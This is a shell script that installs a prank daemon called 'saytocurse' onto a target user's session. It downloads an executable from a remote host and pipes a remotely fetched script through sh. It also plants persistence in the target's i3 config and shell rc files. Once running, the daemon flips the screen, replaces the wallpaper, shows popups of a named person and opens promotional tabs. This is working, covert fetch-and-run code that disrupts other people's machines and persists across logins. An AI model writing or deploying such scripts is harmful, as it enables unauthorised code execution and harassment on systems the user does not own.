#!/bin/sh
# saytocurse - Sayt-0's personal edition of epikill: Louis' face as wallpaper
# and popups, his quotes typewritten, promo tabs to sayto.dev and his GitHub,
# quick screen flips, then the full chaos once the target goes idle and comes
# back.

dir="${AFS_DIR:-$HOME}/.confloose/bin/saytocurse"
file="$dir/confloose-saytocurse"
quotes="$dir/quotes.txt"
base="${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}"
mkdir -p "$dir"

# Any failed download: install nothing and exit non-zero so install.sh records nothing.
curl -fsSL "$base/confloose/saytocurse/daemon.sh" > "$file"            || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/saytocurse/louis.jpg" > "$dir/louis.jpg"     || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/saytocurse/quotes.txt" > "$quotes"          || { rm -rf "$dir"; exit 1; }
chmod +x "$file"

# Save the current layout at apply time: the antidote restores it instead of a
# hard-coded one (the fleet does not all run the same layout or variant).
if command -v setxkbmap >/dev/null 2>&1; then
    layout=$(setxkbmap -query 2>/dev/null | awk '/^layout:/{print $2}')
    [ -n "$layout" ] && setxkbmap -query 2>/dev/null \
        | awk '/^(layout|variant|options):/{printf "%s=%s\n", $1, $2}' > "$dir/layout.bak" || :
fi

# Keep the current wallpaper command, when the target sets one with feh, so
# the antidote can put it back after the daemon replaced it with Louis.
[ -f "$HOME/.fehbg" ] && cp "$HOME/.fehbg" "$dir/fehbg.bak"

# Restart across logins: exec_always in the i3 config re-runs the daemon at
# every session start, so a logout without the antidote does not defuse the
# prank. Tagged like the rc lines, the antidote removes it with one sed.
conf="$HOME/.config/i3/config"
mkdir -p "$(dirname "$conf")"
touch "$conf"
line="exec_always $file 2>/dev/null 1>&2 & # confloose by leo [saytocurse]"
grep -qF -- "$line" "$conf" || echo "$line" >> "$conf"
i3-msg restart >/dev/null 2>&1 || true

echo $(curl -fsSL "$base/confloose/bashrc_confloose_base.sh") "saytocurse" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
# Start now too; the daemon's lock makes a second start a no-op.
"$file" >/dev/null 2>&1 &
for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
